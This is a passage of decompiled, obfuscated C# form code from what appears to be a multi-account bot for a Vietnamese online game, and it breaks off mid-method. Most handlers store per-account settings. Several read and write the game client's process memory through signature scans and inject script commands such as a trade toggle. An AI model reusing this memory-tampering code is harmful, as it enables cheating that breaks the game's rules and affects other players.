			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_0[2].int_2 = Class11.smethod_11(textBoxChuyenTrai3.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxChuyenPhai1_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_1[0].int_0 = Convert.ToByte(checkBoxChuyenPhai1.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxChuyenPhai1_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_1[0].int_1 = Class83.smethod_12(characterAccountConfig_1[num].gstruct58_0, comboBoxChuyenPhai1.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxChuyenPhai1_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_1[0].int_2 = Class11.smethod_11(textBoxChuyenPhai1.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxChuyenPhai2_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_1[1].int_0 = Convert.ToByte(checkBoxChuyenPhai2.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxChuyenPhai2_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_1[1].int_1 = Class83.smethod_12(characterAccountConfig_1[num].gstruct58_0, comboBoxChuyenPhai2.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxChuyenPhai2_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_1[1].int_2 = Class11.smethod_11(textBoxChuyenPhai2.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxChuyenPhai3_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_1[2].int_0 = Convert.ToByte(checkBoxChuyenPhai3.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxChuyenPhai3_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_1[2].int_1 = Class83.smethod_12(characterAccountConfig_1[num].gstruct58_0, comboBoxChuyenPhai3.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxChuyenPhai3_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_1[2].int_2 = Class11.smethod_11(textBoxChuyenPhai3.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxGapBossChieu_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_2.int_0 = Convert.ToByte(checkBoxGapBossChieu.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxGapBoss_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_2.int_1 = Class83.smethod_12(characterAccountConfig_1[num].gstruct58_0, comboBoxGapBoss.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxGapBossNL_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_2.int_3 = Convert.ToByte(checkBoxGapBossNL.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxGapBoss_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_2.int_2 = Class11.smethod_11(textBoxGapBoss.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxClickNPCMenu_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23 && !FormMenuClick.bool_0)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_9 = Class11.smethod_70(textBoxClickNPCMenu.Text, new char[6] { ',', ';', '.', '/', ':', '-' });
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxMenuTest_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23 && !FormMenuClick.bool_0)
		{
			FormLocdoTest.int_13 = Class11.smethod_70(textBoxMenuTest.Text, new char[6] { ',', ';', '.', '/', ':', '-' });
			Class66.smethod_11(Class66.smethod_1(), FormLocdoTest.string_1, Class11.smethod_69(FormLocdoTest.int_13), "", 0);
		}
	}

	private void textBoxMuaMienphiMenu_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23 && !FormMenuClick.bool_0)
		{
			int_134 = Class11.smethod_70(textBoxMuaMienphiMenu.Text, new char[6] { ',', ';', '.', '/', ':', '-' });
			Class66.smethod_11(Class66.smethod_1(), string_44, Class11.smethod_69(int_134), "", 0);
		}
	}

	private void textBoxClickMenuTS_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23 && !FormMenuClick.bool_0)
		{
			string_45 = textBoxClickMenuTS.Text.Replace(" ", "");
			Class66.smethod_11(Class66.smethod_1(), "tbMenuTrinhsat", string_45, "", 0);
		}
	}

	private void checkBoxThanhTruot_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				int num2 = Convert.ToByte(checkBoxThanhTruot.Checked);
				characterAccountConfig_1[num].gstruct49_0.int_6 = num2;
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_14, num2, 4);
				Class56.smethod_13(characterAccountConfig_1[num]);
				textBoxThoiGianTruot.Enabled = num2 > 0;
			}
		}
	}

	private void textBoxThoiGianTruot_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct49_0.int_7 = Class11.smethod_11(textBoxThoiGianTruot.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxDungCodinh_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				int num2 = Convert.ToByte(checkBoxDungCodinh.Checked);
				characterAccountConfig_1[num].gstruct49_0.int_8 = num2;
				uint[] array = Class38.smethod_30(characterAccountConfig_1[num]);
				characterAccountConfig_1[num].gstruct49_0.int_9 = (int)array[0];
				characterAccountConfig_1[num].gstruct49_0.int_10 = (int)array[1];
				CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
				Class75.smethod_2(characterAccountConfig, Class75.uint_15, num2, 4);
				Class75.smethod_2(characterAccountConfig, Class75.uint_16, characterAccountConfig.gstruct49_0.int_9, 4);
				Class75.smethod_2(characterAccountConfig, Class75.uint_16 + 1, characterAccountConfig.gstruct49_0.int_10, 4);
				Class75.smethod_2(characterAccountConfig, Class75.uint_16 + 2, Class39.smethod_0(characterAccountConfig), 4);
				Class56.smethod_13(characterAccountConfig);
			}
		}
	}

	private void textBoxPhamviNhatqua_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct49_0.int_1 = Class11.smethod_11(textBoxPhamviNhatqua.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonResetTenNhatQua_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			string text = Class56.string_22;
			characterAccountConfig_1[num].gstruct49_0.string_0 = text;
			Class56.smethod_13(characterAccountConfig_1[num]);
			text = Class1.smethod_1(text, 1);
			comboBoxNhatQua.Items.Clear();
			comboBoxNhatQua.Items.Add(text);
			comboBoxNhatQua.Text = text;
		}
	}

	private void comboBoxNhatQua_MouseDown(object sender, MouseEventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string_60 = new string[1] { Class56.string_22 };
		Class4.smethod_0(characterAccountConfig_1[num], ref string_60);
		Class4.smethod_1(characterAccountConfig_1[num], ref string_60);
		Class4.smethod_2(characterAccountConfig_1[num], ref string_60);
		string text = comboBoxNhatQua.Text;
		bool_23 = false;
		comboBoxNhatQua.Items.Clear();
		for (int i = 0; i < string_60.Length; i++)
		{
			string text2 = Class1.smethod_1(string_60[i], 1);
			comboBoxNhatQua.Items.Add(text2);
			if (text2 == text)
			{
				comboBoxNhatQua.Text = text;
			}
		}
		bool_23 = true;
	}

	private void comboBoxNhatQua_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || string_60 == null)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxNhatQua.Text;
		for (int i = 0; i < string_60.Length; i++)
		{
			if (Class1.smethod_1(string_60[i], 1) == text)
			{
				characterAccountConfig_1[num].gstruct49_0.string_0 = string_60[i];
				Class56.smethod_13(characterAccountConfig_1[num]);
				break;
			}
		}
	}

	private void buttonVang_Click(object sender, EventArgs e)
	{
		FormDoiMauBang.smethod_0(1u);
	}

	private void buttonXanh_Click(object sender, EventArgs e)
	{
		FormDoiMauBang.smethod_0(3u);
	}

	private void buttonTim_Click(object sender, EventArgs e)
	{
		FormDoiMauBang.smethod_0(2u);
	}

	private void buttonTudoiMaubang_Click(object sender, EventArgs e)
	{
		if (FormDoiMauBang.bool_0)
		{
			FormDoiMauBang.bool_0 = false;
			return;
		}
		if (FormDoiMauBang.gstruct2_0.characterAccountConfig_0.int_136 != 0 && FormDoiMauBang.gstruct2_0.characterAccountConfig_0.string_22 != null && !(FormDoiMauBang.gstruct2_0.characterAccountConfig_0.string_22 == string.Empty))
		{
			try
			{
				FormDoiMauBang formDoiMauBang = new FormDoiMauBang();
				formDoiMauBang.int_0 = Cursor.Position.X;
				formDoiMauBang.int_1 = Cursor.Position.Y;
				formDoiMauBang.Show();
				return;
			}
			catch
			{
				return;
			}
		}
		FormTip.smethod_0("Đổi màu", "Hãy chọn trước tên ac đổi màu.", 300000, 230, 140);
	}

	private void method_35()
	{
		if (FormLocdo.bool_0)
		{
			FormLocdo.bool_0 = false;
			return;
		}
		try
		{
			FormLocdo.int_4 = 0;
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				FormLocdo.int_4 = characterAccountConfig_1[num].int_136;
			}
			FormLocdo formLocdo = new FormLocdo();
			formLocdo.int_0 = base.Left;
			formLocdo.int_1 = base.Top;
			formLocdo.int_2 = base.Width;
			formLocdo.int_3 = base.Height;
			formLocdo.Show();
		}
		catch
		{
		}
	}

	private void labelLocdo_Click(object sender, EventArgs e)
	{
		method_35();
	}

	private void labelLocBando_Click(object sender, EventArgs e)
	{
		method_35();
	}

	private void buttonBandoCTC_Click(object sender, EventArgs e)
	{
		string text = "09XFDlyObTi2MC9dwTnj8KJSLPJcNQpEAIKKaricMh/ubs9T8M7MyyDTFJ/Di3IVHPOo5qKAjGMbHu5eDPR8CIgxNy8d5ukQaKBAAwctSBSOTHi4a2Em0D17iXMLYcdSzRwcsawbknF4ATDgj0w4vAW7Ai4A";
		FormTip.smethod_0(string_49, Class11.smethod_72(text), 600000, 380, 180, bool_8: false, base.Left, base.Top, bool_9: false, bool_10: false, bool_11: true);
	}

	private void checkBoxTuChayVA_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_122 = Convert.ToByte(checkBoxTuChayVA.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonBatGiaodichAll_Click(object sender, EventArgs e)
	{
		bool_33 = !bool_33;
		if (!bool_33)
		{
			buttonBatGiaodichAll.Text = "Bật giao dịch tất cả";
		}
		else
		{
			buttonBatGiaodichAll.Text = "Tắt giao dịch tất cả";
		}
		new Thread(method_36).Start();
	}

	private void method_36()
	{
		int num = -1;
		while (true)
		{
			num++;
			try
			{
				if (characterAccountConfig_1 != null && characterAccountConfig_1.Length > num)
				{
					CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
					uint num2 = Class24.smethod_30(Class56.memorySignatureScanConfig_11.uint_0, characterAccountConfig.int_137);
					uint num3 = Class24.smethod_30(num2 + Class56.memorySignatureScanConfig_13.uint_0, characterAccountConfig.int_137) * Class56.memorySignatureScanConfig_15.uint_0;
					uint num4 = Class24.smethod_30(Class56.memorySignatureScanConfig_14.uint_0, characterAccountConfig.int_137);
					uint num5 = num4 + num3;
					uint num6 = Class24.smethod_30(num5 + Class56.memorySignatureScanConfig_66.uint_0, characterAccountConfig.int_137);
					if ((bool_33 && num6 == 0) || (!bool_33 && num6 != 0))
					{
						Class75.smethod_57(characterAccountConfig, "Switch([[trade]])");
					}
					continue;
				}
				break;
			}
			catch
			{
				num = -1;
			}
		}
	}

	private void linkLabelPhimPhichiendau_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		string text = "https://youtu.be/72eBN2IrG5Q";
		Class24.smethod_40(Class66.smethod_0(), "", text, 0);
		string text2 = "Copy link sau dán vào trình duyệt nếu không tự chạy: " + Class56.string_7 + text;
		FormTip.smethod_0(string_49, text2, 600000, 250, 80);
	}

	private void checkBoxTienSkill_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct50_0.int_0 = Convert.ToByte(checkBoxTienSkill.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonTienSkill_Click(object sender, EventArgs e)
	{
		if (FormTienSkill.bool_0)
		{
			FormTienSkill.bool_0 = false;
			return;
		}
		try
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				FormTienSkill.int_0 = characterAccountConfig_1[num].int_136;
				FormTienSkill formTienSkill = new FormTienSkill();
				formTienSkill.Show();
			}
		}
		catch
		{
		}
	}

	private void linkLabelMuaMienphiMn_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		if (FormMenuClick.bool_0)
		{
			FormMenuClick.bool_0 = false;
			return;
		}
		try
		{
			FormMenuClick.string_0 = string_44;
			FormMenuClick.int_2 = int_134;
			FormMenuClick formMenuClick = new FormMenuClick();
			formMenuClick.int_0 = Cursor.Position.X;
			formMenuClick.int_1 = Cursor.Position.Y;
			formMenuClick.Show();
		}
		catch
		{
			FormMenuClick.string_0 = null;
			FormMenuClick.bool_1 = false;
			FormMenuClick.bool_0 = false;
		}
	}

	private void checkBoxKhongNhapso_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_104 = Convert.ToByte(checkBoxKhongNhapso.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagMuaMpKhongNhapSo", int_104, "", 0);
		}
	}

	private void checkBoxHoasonMuathuoc_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				characterAccountConfig_1[num].int_105 = Convert.ToByte(checkBoxHoasonMuathuoc.Checked);
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, characterAccountConfig_1[num].int_105, 4);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxMuaThon_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_105 = Convert.ToByte(checkBoxMuaThon.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagMuaThonTran", int_105, "", 0);
		}
	}

	private void checkBoxMuaNgamy_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				characterAccountConfig_1[num].int_70 = Convert.ToByte(checkBoxMuaNgamy.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxTatmuaAll_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			bool_18 = checkBoxTatmuaAll.Checked;
			if (!bool_18)
			{
				checkBoxTatmuaAll.BackColor = SystemColors.Control;
				checkBoxTatmuaAll.ForeColor = Color.Green;
			}
			else
			{
				checkBoxTatmuaAll.BackColor = Color.DarkGreen;
				checkBoxTatmuaAll.ForeColor = Color.White;
			}
		}
	}

	private void checkBoxDoiTitle_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_71 = Convert.ToByte(checkBoxDoiTitle.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagDoiTitle", int_71, "", 0);
			method_37();
		}
	}

	private void method_37()
	{
		if (int_71 > 0)
		{
			string_49 = new Random().Next(10000, 10000000) + " " + string_1;
		}
		else
		{
			string_49 = string_3;
		}
		base.Text = string_49;
	}

	private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		string text = Class11.smethod_72("fZI/TwIxGMb3+xTvB0AGR1cXE5WJsBCHWgi9wPUMXAmMxsE4GMNIWCCEGA1Eok7XGIfqfY9+E5/ecR5Kwta79v09f9qaWVHD6gVF3VC2SJipFFgzrLl5o0PqhDae+RQJZfWIH1Gl9f1EJyHDwup7TmdWj/GNOeqb6b7tKgDAnvpB2fNqOJtJBlDnxIUaWn0jcyGKGP4BIfdJet4BVWz8qagtzLvzLJq87YyEVKcLOs6pXJgVgg3MDGTRDCkyzyBXhVkW0tzG853EcImjQC7TGUeKN+VcCRs/Smr5WTApmCoXjgorvzpW3xVqDTXEiI0X0Z6ApdxN22d5xq9RsrZ6vtWZM+cMNZI1dbPeXv7WfZ6WXO9vVVLkc7gJB96nQLHiqpmKQurZ+GP3dtKGMZjMIHHpXgs0xz4NcKMl6jEFlzCEu50475gN3KsCTY+ok/rHTE7j5lVSJ2v9/zMskUzrjCDwwIAF7FqlzFvnB9E3FjE/dPsuRPkH");
		FormTip.smethod_0("Chuyen chinh xac", text, 300000, 340, 300);
	}

	private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		int num = Convert.ToByte(checkBoxTuChayVA.Checked);
		if (characterAccountConfig_1 != null)
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				characterAccountConfig_1[i].int_122 = num;
				Class56.smethod_13(characterAccountConfig_1[i]);
			}
		}
		if (num > 0)
		{
			string text = "Vượt ải để chế độ WAR, và lưu ý:||Nếu check [v] Tìm ac chính, thì chỉ có ac chính chạy tọa độ.||Còn nếu bỏ (không) check [ ] Tìm ac chính, thì tất cả đều chạy tọa độ.||Có thể kết hợp chức năng [v] Đi đến điểm tập kết khác => để click Npc Nhiếp Thí Trần tự đi vượt ải (thiết lập click menu 1,1,1 )";
			FormTip.smethod_0(string_49, text, 90000, 310);
		}
	}

	private void buttonMd_Click(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				int num2 = Class83.smethod_13(characterAccountConfig_1[num]);
				int num3 = Class83.smethod_16(characterAccountConfig_1[num], num2);
				int num4 = Class83.smethod_20(characterAccountConfig_1[num], num2, num3);
				characterAccountConfig_1[num].int_96 = num4 - 12;
				Class56.smethod_13(characterAccountConfig_1[num]);
				textBoxKhoangCachTiepcan.Text = (num4 - 12).ToString();
			}
		}
	}

	private void buttonNhiepTT_Click(object sender, EventArgs e)
	{
		if (FormNhiepTT.bool_0)
		{
			FormNhiepTT.bool_0 = false;
			return;
		}
		try
		{
			FormNhiepTT formNhiepTT = new FormNhiepTT();
			formNhiepTT.int_8 = Cursor.Position.X;
			formNhiepTT.int_9 = Cursor.Position.Y;
			formNhiepTT.int_10 = base.Width;
			formNhiepTT.int_11 = base.Height;
			formNhiepTT.Show();
		}
		catch
		{
		}
	}

	private void checkBoxTuClickNTT_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_123 = Convert.ToByte(checkBoxTuClickNTT.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonTC_Click(object sender, EventArgs e)
	{
		new Thread(Class28.smethod_0).Start();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (FormTuyenchien.bool_0)
		{
			FormTuyenchien.bool_0 = false;
			return;
		}
		try
		{
			FormTuyenchien formTuyenchien = new FormTuyenchien();
			formTuyenchien.int_0 = base.Left;
			formTuyenchien.int_1 = base.Top;
			formTuyenchien.int_2 = base.Width;
			formTuyenchien.int_3 = base.Height;
			formTuyenchien.Show();
		}
		catch
		{
		}
	}

	private void buttonDongtien_Click(object sender, EventArgs e)
	{
		if (FormPushMoney.int_0 > 0)
		{
			FormPushMoney.int_0 = 0;
			return;
		}
		try
		{
			FormPushMoney.int_1 = 0;
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				FormPushMoney.int_1 = characterAccountConfig_1[num].int_136;
			}
			FormPushMoney formPushMoney = new FormPushMoney();
			formPushMoney.Show();
		}
		catch
		{
		}
	}

	private void checkBoxVSTDong2_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_135 = Convert.ToByte(checkBoxVSTDong2.Checked);
			}
		}
	}

	private void buttonReset1ac_Click(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23 && int_158 <= 0)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				int_158 = characterAccountConfig_1[num].int_136;
				string_61 = characterAccountConfig_1[num].string_22;
				new Thread(method_38).Start();
				Thread.Sleep(100);
			}
			else
			{
				Class11.string_17 = new string[1] { "Hãy chọn 1 ac lỗi cần xóa cấu hình..." };
			}
		}
	}

	private void method_38()
	{
		if (int_158 != 0 && string_61 != null && !(string_61 == string.Empty))
		{
			string text = Class56.string_10 + "\\" + Class11.smethod_45(string_61) + ".cfg";
			ThemXoaDanhsach.int_1 = new int[1] { int_158 };
			int num = 0;
			int num2 = characterAccountConfig_1.Length;
			while (num < 10)
			{
				num++;
				Thread.Sleep(100);
				if (characterAccountConfig_1 == null)
				{
					break;
				}
				try
				{
					if (characterAccountConfig_1.Length == num2)
					{
						continue;
					}
					bool flag = false;
					for (int i = 0; i < characterAccountConfig_1.Length; i++)
					{
						if (characterAccountConfig_1[i].int_136 == int_158)
						{
							flag = true;
							break;
						}
					}
					if (flag)
					{
						continue;
					}
					break;
				}
				catch
				{
				}
			}
			Class11.smethod_20(text);
			Thread.Sleep(100);
			ThemXoaDanhsach.int_0 = new int[1] { int_158 };
			Class11.string_17 = new string[1] { "Đã xóa lỗi cấu hình ac <" + Class1.smethod_1(string_61, 1) + "> về mặc định..." };
			int_158 = 0;
			string_61 = null;
		}
		else
		{
			int_158 = 0;
			string_61 = null;
		}
	}

	private void buttonCopyPosXY_Click(object sender, EventArgs e)
	{
		if (listViewTrain.Items.Count <= 0)
		{
			return;
		}
		string text = string.Empty;
		for (int i = 0; i < listViewTrain.Items.Count; i++)
		{
			if (text != string.Empty && text != null)
			{
				text += Class56.string_7;
			}
			text += listViewTrain.Items[i].SubItems[1].Text;
		}
		if (!(text != string.Empty))
		{
			return;
		}
		try
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				object obj = text;
				text = string.Concat(obj, Class56.string_7, "MAP_ID: ", characterAccountConfig_1[num].int_32, Class56.string_7);
			}
			Clipboard.SetText(text);
		}
		catch
		{
		}
	}

	private void checkBoxGame_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled)
		{
			return;
		}
		Class70.int_0 = Convert.ToByte(checkBoxGame.Checked);
		Class66.smethod_11(Class66.smethod_1(), "fixgCash", Class70.int_0, "", 0);
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		try
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				int num = 0;
				while (Class70.int_1 > 0 && num < 6)
				{
					num++;
					Thread.Sleep(100);
				}
				Class70.int_1 = characterAccountConfig_1[i].int_136;
				new Thread(Class70.smethod_39).Start();
			}
		}
		catch
		{
		}
	}

	private void checkBoxThu_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_135 = Convert.ToByte(checkBoxThu.Checked);
			Class66.smethod_11(Class66.smethod_1(), "fThunhoAuto", int_135, "", 0);
			if (int_135 > 0)
			{
				base.WindowState = FormWindowState.Minimized;
			}
		}
	}

	private void checkBoxXoaMn_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			FormClickNPC.int_7 = Convert.ToByte(checkBoxXoaMn.Checked);
			Class66.smethod_11(Class66.smethod_1(), "fXoaMenuSauClickNPC", FormClickNPC.int_7, "", 0);
		}
	}

	private void textBoxXoaMn_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			FormClickNPC.int_8 = Class11.smethod_11(textBoxXoaMn.Text);
			Class66.smethod_11(Class66.smethod_1(), "iXoaMenuSauClickNPC", FormClickNPC.int_8, "", 0);
		}
	}

	private void checkBoxTuChonClick_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_99 = Convert.ToByte(checkBoxTuChonClick.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagTuchonRowTrinhsat", int_99, "", 0);
		}
	}

	private void textBox4_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			string_37 = textBox4.Text.Replace(" ", "");
			Class66.smethod_11(Class66.smethod_1(), "IdexThpCTC", string_37, "", 0);
		}
	}

	private void richTextBoxStatus_TextChanged(object sender, EventArgs e)
	{
	}

	private void method_39(object sender, EventArgs e)
	{
	}

	private void label26_Click(object sender, EventArgs e)
	{
	}

	private void labelToadoTrinhsat_Click(object sender, EventArgs e)
	{
	}

	private void label8_Click(object sender, EventArgs e)
	{
	}

	private void textBox3_TextChanged(object sender, EventArgs e)
	{
	}

	private void checkBoxFixtoadolag_CheckedChanged(object sender, EventArgs e)
	{
		if (int_24 != 1)
		{
			if (checkBoxFixtoadolag.Checked)
			{
				MessageBox.Show("Chức năng này chỉ sử dụng được khi chọn chế độ Tống Kim (TK).", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				checkBoxFixtoadolag.Checked = false;
			}
		}
		else if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				if (checkBoxFixtoadolag.Checked)
				{
					if (string.IsNullOrEmpty(comboBoxAccChinh.Text))
					{
						MessageBox.Show("Vui lòng chọn tài khoản acc chính trước khi sử dụng chức năng này.", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
						checkBoxFixtoadolag.Checked = false;
						return;
					}
					string_50 = comboBoxAccChinh.Text;
					intptr_1 = method_40(string_50);
					if (intptr_1 == IntPtr.Zero)
					{
